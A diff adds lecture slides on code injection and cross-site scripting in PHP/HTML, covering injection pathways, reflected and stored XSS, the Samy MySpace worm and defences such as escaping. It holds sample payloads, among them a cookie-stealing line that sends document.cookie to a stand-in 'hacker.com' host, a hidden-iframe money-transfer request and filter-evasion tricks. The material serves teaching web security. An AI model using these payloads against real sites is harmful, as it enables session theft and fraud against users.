@@ -1,0 +1,595 @@
+---
+categories: Classes Security PHP HTML
+toc: no
+...
+
+view this as a [slideshow](?export&format=Slidy)
+
+
+# Code injection
+
+<svg
+   width="1200"
+   height="650">
+  <defs
+     id="defs4">
+    <marker
+       inkscape:stockid="Arrow1Lend"
+       orient="auto"
+       refY="0"
+       refX="0"
+       id="Arrow1Lend"
+       style="overflow:visible">
+      <path
+         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
+         style="fill-rule:evenodd;stroke:#000;"
+         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
+    </marker>
+  </defs>
+  <g transform="translate(282.72338,-54.173922) scale(1.25)">
+    <rect
+       style="fill:none;stroke:#000;stroke-width:0.6;stroke-dasharray:2.92992042, 0.97664014"
+       width="165.71237"
+       height="281.82312"
+       x="101.18707"
+       y="158.82298" />
+    <text x="120.39771" y="146.25534">
+        <tspan
+         x="120.39771"
+         y="146.25534">Server</tspan></text>
+    <text x="616.16119" y="462.61093"><tspan
+         x="616.16119"
+         y="462.61093">Client</tspan></text>
+    <text
+       x="558.67902"
+       y="117.28503"><tspan
+         x="558.67902"
+         y="117.28503">Attacker</tspan></text>
+    <text
+       style="font-family:monospace;font-size:smaller"
+       x="282.06912"
+       y="224.10202"><tspan
+         x="282.06912"
+         y="224.10202">GET /page.php?userval=<tspan style="fill:#ff0000;">code</tspan></tspan></text>
+    <text
+       style="font-family:monospace;font-size:smaller"
+       x="282.66431"
+       y="366.67291"><tspan
+         x="282.66431"
+         y="366.67291">POST /page.php</tspan><tspan
+         x="282.66431"
+         y="386.67291">....</tspan><tspan
+         x="282.66431"
+         y="426.67291">userval=<tspan style="fill:#ff0000">code</tspan></tspan></text>
+    <text
+       style="font-family:monospace;font-size:smaller"
+       x="282.72018"
+       y="280.52457"><tspan
+         x="282.72018"
+         y="280.52457">GET /page.php</tspan><tspan
+         x="282.72018"
+         y="300.52457">...</tspan><tspan
+         x="282.72018"
+         y="320.52457">Cookie: userval=<tspan style="fill:#ff0000">code</tspan></tspan></text>
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 587.14111,142.36185 c 0,0 -46.11906,44.40322 -75.26205,55.41546 -17.58465,6.64471 -56.17691,4.95028 -56.17691,4.95028 l -218.64195,0" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 612.26865,145.21287 c 0,0 -0.90934,64.1013 -22.17718,83.47753 -21.61431,19.59093 -71.16389,23.1171 -108.06215,27.78481 -70.60874,8.93215 -233.51441,0 -233.51441,0" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 615.82691,433.43399 c 0,0 -72.38793,-16.81896 -108.04451,-34.14738 -24.30416,-11.81136 -46.22842,-45.56561 -72.14732,-47.74327 -70.13283,-5.89243 -185.9292,-4.78941 -185.9292,-4.78941" />
+    <text
+       style="font-family:monospace;font-size:90%"
+       x="145.46939"
+       y="206.77438"><tspan
+         x="145.46939"
+         y="206.77438">\$\_GET</tspan></text>
+    <text
+       style="font-family:monospace;font-size:90%"
+       x="139.90759"
+       y="353.86218"><tspan
+         x="139.90759"
+         y="353.86218">\$\_POST</tspan></text>
+    <text
+       style="font-family:monospace;font-size:90%"
+       x="116.29983"
+       y="262.17676"><tspan
+         x="116.29983"
+         y="262.17676">\$\_COOKIE</tspan></text>
+    <rect
+       style="fill:none;stroke:#000;stroke-dasharray:2.92992042, 0.97664014"
+       width="156.95905"
+       height="155.05975"
+       x="-96.716225"
+       y="250.56323" />
+    <text
+       style="font-size:smaller"
+       x="-90.57119"
+       y="431.72263"><tspan
+         x="-90.57119"
+         y="431.72263">Scripting engine</tspan></text>
+    <text
+       style="font-size:smaller"
+       x="-27.780369"
+       y="144.02188"><tspan
+         x="-27.780369"
+         y="144.02188">Database</tspan></text>
+    <path
+       style="fill:none;stroke:#000;stroke-width:0.6;"
+       d="m -187.55218,232.42253 c 0,7.96786 -10.04769,14.42709 -22.44214,14.42709 -12.39446,0 -22.44214,-6.45923 -22.44214,-14.42709 0,-7.96786 10.04768,-14.42709 22.44214,-14.42709 12.39445,0 22.44214,6.45923 22.44214,14.42709 z"
+       transform="translate(219.4877,-65.958513)" />
+    <path
+       transform="translate(219.07566,-29.036599)"
+       style="fill:none;stroke:#000;stroke-width:0.6;"
+       d="m -187.55218,232.42253 c 0,7.96786 -10.04769,14.42709 -22.44214,14.42709 -12.39446,0 -22.44214,-6.45923 -22.44214,-14.42709 0,-7.96786 10.04768,-14.42709 22.44214,-14.42709 12.39445,0 22.44214,6.45923 22.44214,14.42709 z" />
+    <path
+       style="fill:none;stroke:#000;stroke-width:0.6"
+       d="m -13.147253,166 0,36" />
+    <path
+       style="fill:none;stroke:#000;stroke-width:0.6"
+       d="m 31.9,166 0,36" />
+    <rect
+       style="fill:none;stroke:#000"
+       width="127.67582"
+       height="82.231422"
+       x="-222.28365"
+       y="126.78767" />
+    <rect
+       style="fill:#000;stroke:#000;"
+       width="111.96162"
+       height="65.96067"
+       x="-214.99567"
+       y="134.07567" />
+    <text
+       style="font-size:smaller;fill:#ffffff;font-family:monospace;"
+       x="-207.70767"
+       y="155.93962"><tspan
+         x="-207.70767"
+         y="155.93962">\$ system\_</tspan></text>
+    <text
+       style="font-size:smaller;font-family:Monospace;"
+       x="-75.309212"
+       y="310.202"><tspan
+         x="-75.309212"
+         y="310.202">\$localvar</tspan></text>
+    <path
+       style="fill:none;stroke:#000;stroke-dasharray:1, 2;stroke-dashoffset:0"
+       transform="translate(60,-70) scale(1,1.3)"
+       d="m 261.58487,74.673922 c 0,0 101.43142,14.241518 151.50617,36.692898 52.99984,23.76287 96.65917,42.24561 111.26235,87.58951 17.94967,55.73498 25.10441,133.29615 8.28549,189.38271 -10.97445,36.59683 -29.23571,55.85018 -68.65123,75.75309 -44.30646,22.37259 -166.89352,39.06018 -166.89352,39.06018" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 139.68644,201.48955 c 0,0 -23.42052,4.87595 -30.01711,11.30623 C 95.438851,226.66746 69.05891,254.85015 44.335262,267.68877 36.24837,271.88817 9.0105298,281.88653 2.60863e-7,277.40609 -17.224554,268.84128 -9.7173178,219.10218 -9.7173178,219.10218" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 126.11738,346.41552 c -39.274163,0.60733 -84.558795,0.92095 -123.8092389,5.41406 -31.8503901,3.64601 -54.1035391,17.7565 -56.8627841,24.83137 -8.025936,20.57899 29.02049,19.47931 46.992433,19.59046 83.972727,0.51933 196.10141,11.85331 205.26659,13.55175 49.65735,9.20223 26.76604,58.14265 77.251,59.48533 178.08888,4.73641 140.6787,2.80521 318.82953,3.41254" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 629.69752,130.30509 24.85649,287.625" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 247.85188,146.9033 c 0,0 10.59461,0.65494 -10.77617,33.52586 2.57626,20.8974 21.82161,9.34694 29.93381,5.98676 30.24537,-12.52804 41.23105,-52.8444 69.44642,-69.44642 15.02561,-8.84112 33.00171,-12.1119 50.28879,-14.36823 105.68659,-13.794358 216.77251,33.68717 319.693,5.98676 31.99072,-8.610105 85.012,-51.486137 85.012,-51.486137"
+       transform="translate(-222.72338,74.173922)" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 338.85064,194.79738 c 0,0 -17.77898,18.6138 -35.92056,26.34175 -18.65457,7.94648 -59.86761,10.77617 -59.86761,10.77617"
+       transform="translate(-222.72338,74.173922)" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 141.28755,230.71795 c 0,0 -41.1046,-19.94561 -55.078199,-37.11792 -11.975641,-14.717 -21.552338,-52.68349 -21.552338,-52.68349"
+       transform="translate(-222.72338,74.173922)" />
+  </g>
+</svg>
+
+
+# HTTP Injection pathways
+
+An attacker can inject code in every data normally coming from the browser:
+
+**GET parameters**
+
+~~~ {.html}
+http://www.example.org/index.php?page=<script>alert("injection");</script>
+~~~
+
+or using [URL escaping](URL)
+
+~~~ {.html}
+http://www.example.org/index.php?page=%3Cscript%3Ealert%28%22injection%22%29;%3C%2Fscript%3E
+~~~
+
+**POST data** include hidden fields and Web 2.0 data (e.g. [JSON]())
+
+<input style="margin-left:10em;font-size:100%" type="text" value="alert('injection');"/>
+
+**Cookies**
+
+~~~
+GET /index.php HTTP/1.1
+Host: www.example.com
+Cookie: id=alert('injection');
+~~~
+
+**HTTP headers**
+
+~~~
+GET /index.php HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0"><script>alert('injection');</script><p class="
+~~~
+
+
+
+# Cross Site Scripting
+
+[XSS]() (Cross Site Scripting) is another name for
+[HTMl]()/[JavaScript]() code injection in the response to the client.
+
+
+[PHP]() code *reflects* user input with no filtering
+
+~~~ {.php}
+<form method="GET">
+  <input type="text" name="search" value="<?php
+    echo $_GET[search];
+  ?>" />
+</form>
+~~~
+
+Attacker injects code in a web page
+
+~~~ {.html}
+http://www.example.com/?search="><script="http://hackers.com/evil.js"></script><br class="
+~~~
+
+Victim visits `www.example.com`, but malicious code is executed.
+
+
+
+# Reflected and Permanent XSS
+
+**Reflected XSS:** The code is injected when the client visits the
+  link
+
+> - GET parameters
+> - Form fields
+> - Search results
+
+~~~ {.html}
+From: "order-update@amazon.com" <order-update@amazon.com>
+Subject: Amazon.com - Your Cancellation (175-2364376-728612)
+
+<html><body>
+Your order has been successfully canceled. For your reference,
+here's a summary of your order:<br />
+
+You just canceled order <a
+href="http://www.amazon.com/?var=<script>injection()</script>">#175-2364376-728612</a>
+placed on February 16, 2012. ...
+~~~
+
+**Permanent XSS:** The code is stored on the server (most likely, in the database)
+
+> - Blog posts, forums, ...
+> - Social networks.
+
+
+# Why is it dangerous?
+
+Using [XSS]() an attacker can:
+
+> - Change the page appearance, deface it (search [Stallowned](http://www.google.com/search?q=stallowned)).
+> - Redirect and phish.
+> - Steal cookies and private data!
+> - Propagate the [XSS]() like a worm.
+> - **Control the victim's browser!!!**
+
+The only defense browsers rely upon is **Cross-domain policy**
+
+
+# Cross-domain policy
+
+> At no time, a script from one domain (say `www.hacker.com`) should
+> have access to content from a different domain (say
+> `www.example.com`) from within a document.
+
+
+**The cross-domain policy is enforced for:**
+
+> - [Cookies](Cookie);
+> - [AJAX]() requests;
+> - Frames and iframes content.
+
+**(Necessary) exceptions**
+
+> - Images, audio, video;
+> - Scripts;
+> - Frames and iframes source.
+
+
+
+# Example: cookie theft
+
+Only the **owner domain** should be able to read its cookies
+
+~~~
+HTTP/1.1 200 OK
+Set-Cookie: sessid=a10340f0e; Domain=www.mybank.com; Path=/; Secure;
+~~~
+
+If the attacker can inject the following code
+
+~~~ {.javascript}
+document.write("<img src='https://hacker.com/ck.php?" + document.cookie + "' />");
+~~~
+
+When the victim visits the attacked page, the attacker receives a
+request for
+
+~~~
+https://hacker.com/ck.php?sessid=a10340f0e
+~~~
+
+containing the **session id of the victim**.
+
+
+# Why `<img>`?
+
+The `<img>` tag is frequently used to send data from the victim to the
+attacker:
+
+~~~ {.html}
+<img src='https://hacker.com/ck.php?sessid=a10340f0e' />
+~~~
+
+> - Almost any browser will treat it;
+> - Silent connection (no user click, no confirmation)
+> - Rarely filtered
+
+
+# Another popular object: `<iframe>`
+
+`<iframe>` lets a page embed another page:
+
+~~~ {.html}
+<iframe src="http://en.wikipedia.org/wiki/Framing_(World_Wide_Web)"></iframe>
+~~~
+
+<iframe src="http://en.wikipedia.org/wiki/Framing_(World_Wide_Web)" style="width:80%;margin-left:10%" name="if">
+</iframe>
+
+
+[JavaScript]() can control the iframe behavior:
+<input type="button" onclick="window.frames.if.location.href='http://www.w3schools.com/tags/tag_iframe.asp'" value="Change page" />
+
+~~~ {.javascript}
+window.frames.hf.location.href='http://www.w3schools.com/tags/tag_iframe.asp';
+~~~
+
+Invisible `<iframes>` can be used to:
+
+> - Make [HTTP]() requests (GET or POST) without the user noticing;
+> - Extend a [XSS]() hole in a page to the whole web site;
+> - Cross domain boundaries.
+
+
+# `<iframe>` example
+
+> 1. Attacker injects script on a vulnerable page
+
+~~~
+http://www.example.com/vulnerable?lang=en"></script src="http://hacker.com/evil.js"></script>
+~~~
+
+> 2. Script adds hidden `<iframe>` to the document
+
+~~~ {.javascript}
+document.write('<iframe name="hf" style="display:none"></iframe>');
+~~~
+
+> 3. After a while, the script generates a request to a critical page
+
+~~~ {.javascript}
+function req() {
+  window.frames.hf.location.href=
+    'http://www.example.com/transfermoney?to=hacker&amount=10000';
+}
+setTimeout(req, 5000);
+~~~
+
+> 4. The response for `transfermoney` is sent to the frame, the user
+  hasn't noticed anything.
+
+
+# How to protect your site
+
+**HTML Entities:** Escape, escape, escape!
+
+~~~ {.html}
+<script>alert("XSS");</script>
+~~~
+
+~~~ {.html}
+&lt;script&gt;alert("XSS");&lt;/script&gt;
+~~~
+
+**Use filtering functions**
+
+~~~ {.php}
+<?php
+  echo "Hi, " . htmlspecialchars($_GET['name']);
+?>
+~~~
+
+
+**Whitelists are better than blacklists**
+
+Javascript can be inserted in: [HTML](), [CSS](), [SVG](), ...
+
+In user generated content, permit only
+
+> - safe tags: `<img>`, `<div>`, `<p>`, ...
+> - safe attributes: `src`, `href`, `id`, `class`, ...
+
+
+**Use sanitizer libraries**
+
+
+# How to avoid protections
+
+**Use different encodings**
+
+[URL]() encoding example
+
+~~~ {.javascript}
+%3Cscript%3Ealert%28%22XSS%22%29;%3C%2Fscript%3E  // <script>alert("XSS");</script>
+~~~
+
+Using ASCII codes (e.g. 34 is **`"`**)
+
+~~~ {.javascript}
+document.write('href=' + String.fromCharCode(34) + 'http://hacker.com/' + String.fromCharCode(34));
+~~~
+
+
+**Split filtered keywords**
+
+Supposing `onload` is blacklisted:
+
+~~~ {.javascript}
+var stmt = "window.onl" + "ad = myfunc";
+eval(stmt);
+~~~
+
+
+**Exploit browser bugs** (old versions of IE in particular)
+
+
+# XSS worms: Samy
+
+> - On April 11, 2005 at 1am a worm based on an [XSS]() injection starts spreading on MySpace. 
+> - In less than 24 hours, more than 1 million profiles are infected.
+> - MySpace is forced to shut down for several hours to extirpate the worm.
+
+**How Samy works:**
+
+> 1. MySpace permits personalization of the profile page to some
+  extent. Samy discovers he can embed [JavaScript]() code inside this
+  page.
+> 2. A user visits an infected profile, the malicious [JavaScript]() is run in the user's browser;
+> 3. The malicious [JavaScript]() sends a friendship request to Samy, then adds Samy to the users' *heroes*.
+> 4. Finally, the malicious [JavaScript]() copies itself in the user's profile. The infection gets exponential!
+
+Read the full story at <http://fast.info/myspace/>.
+
+
+# How did Samy get past MySpace protections
+
+**Injection of scripts**
+
+> - MySpace used to block `</script>`, `onxxx`, ...
+> - However, some browsers accept [JavaScript]() in [CSS]() attributes
+
+~~~ {.html}
+<div style="background:url('javascript:alert(1)')">
+~~~
+
+**Nesting quotes** (in my opinion, the nicest trick)
+
+> - The above trick has already used single **`'`** and double **`"`** quotes.
+> - Samy needs to encode strings in [JavaScript](), but MySpace filters **`\'`** and **`\"`**.
+> - Idea: put the [JavaScript]() source in another attribute (uses IE's `document.all`)
+
+~~~ {.html}
+<div id="mycode" expr="alert('hah!')"
+     style="background:url('javascript:eval(document.all.mycode.expr)')"> 
+~~~
+
+
+---------------
+
+
+**Declaring [JavaScript]()**
+
+> - MySpace filters the word "javascript".
+> - Samy exploits an IE "feature".
+
+~~~ {.html}
+<div ... style="background:url('java
+script:eval(...)')">
+~~~
+
+**Some encoding and splitting here and there**
+
+~~~ {.javascript}
+console.log('double quote: ' + String.fromCharCode(34));
+eval('document.body.inne' + 'rHTML'); 
+eval('xmlhttp.onread' + 'ystatechange = callback'); 
+~~~
+
+
+**GET and POST**
+
+> - Samy needs to generate requests (friendship, profile modification, etc.)
+> - He could probably have used iframes, however he found more convenient to generate [AJAX]() requests.
+
+
+--------
+
+**Redirection**
+
+> - At some point, Samy hits a cross-domain wall (between `profile.myspace.com` and `www.myspace.com`.
+> - He redirects the user to `www.myspace.com`.
+
+~~~ {.javascript}
+if (location.hostname == 'profile.myspace.com')
+  document.location = 'http://www.myspace.com' + location.pathname + location.search; 
+~~~
+
+**Hidden tokens**
+
+> - MySpace requires user confirmation before adding a friend: it uses a hidden `<input>` with random value.
+> - Samy makes some more GET and POST requests to simulate user interaction.
+
+
+**The code:** <http://fast.info/myspace/>
+
+
+# Frameworks
+
+**Remotely control the victim's browser!**
+
+> - Gain information on the victims;
+> - Access local storage;
+> - Trigger actions;
+> - **Tunnel HTTP navigation!!!**
+
+**Combine XSS penetration with browser vulnerabilities** (most effective on old browsers)
+
+> - XSS Framework: <http://code.google.com/p/xssf/>;
+> - Browser Exploitation Framework: <http://beefproject.com/>.
+
+
+# The final word
+
+**Why does [XSS]() exist?**
+
+> - A confusion between **data** and **logic**;
+> - A focus on **ease of programming** rather than on **security** by the major actors.
+
+**[XSS]() is here to stay!**
+
+**Rule 1:** Sanitize your data!
+
+**Rule 2:** Analyze data flows, design modularly.
+
+**Rule 3:** (If you are a professional) Use penetration testing tools.
+
+
+**Links**
+
+> - OWASP foundation wiki <https://www.owasp.org>
+> - OWASP [WebScarab](https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project) HTTP proxy;
+> - [Burp Scanner](http://portswigger.net/burp/scanner.html) penetration testing;
+> - OWASP [WebGoat](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project) security training platform.
